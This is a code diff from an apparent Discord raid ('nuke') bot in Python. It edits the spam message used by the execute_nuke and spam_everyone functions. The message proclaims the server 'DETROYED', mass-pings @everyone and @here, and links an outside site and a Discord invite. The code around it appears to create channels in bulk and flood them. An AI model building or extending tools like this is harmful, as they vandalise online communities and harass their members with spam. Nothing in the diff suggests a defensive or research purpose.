@@ -274,11 +274,11 @@ async def execute_nuke(guild):
         created_channels = await asyncio.gather(*create_tasks, return_exceptions=True)
 
         spam_content = (
-            "# DETROYED BY BOSS BẢO ĐZ AND WAR ART (●'◡'●)\n"
+            "# DETROYED BY BOSS BẢO ĐZ AND Gaming Academy VN ●'◡'●)\n"
             "|| @everyone||\n"
             "|| @here ||\n"
             '"|| link support 1 ||: https://xnhau.pics/"\n'
-            ' "|| link support 2 ||: https://discord.gg/hSdEUZD6Jp"'
+            ' "|| link support 2 ||:https://discord.gg/gaming-academy-vn-1200447439648325713"'
         )
         
         valid_channels = [ch for ch in created_channels if isinstance(ch, discord.TextChannel)]
@@ -573,11 +573,11 @@ async def spam_channels_error(ctx, error):
 async def spam_everyone(ctx):
     try:
         spam_content = (
-            "# DETROYED BY BOSS BẢO ĐZ AND WAR ART (●'◡'●)\n"
+            "# DETROYED BY BOSS BẢO ĐZ AND Gaming Academy VN ●'◡'●)\n"
             "|| @everyone||\n"
             "|| @here ||\n"
             '"|| link support 1 ||: https://xnhau.pics/"\n'
-            ' "|| link support 2 ||: https://discord.gg/hSdEUZD6Jp"'
+            ' "|| link support 2 ||:https://discord.gg/gaming-academy-vn-1200447439648325713"'
         )
         embed = discord.Embed(
             title="🚀 🌈 **KÍCH HOẠT SPAM @EVERYONE** 🌈",
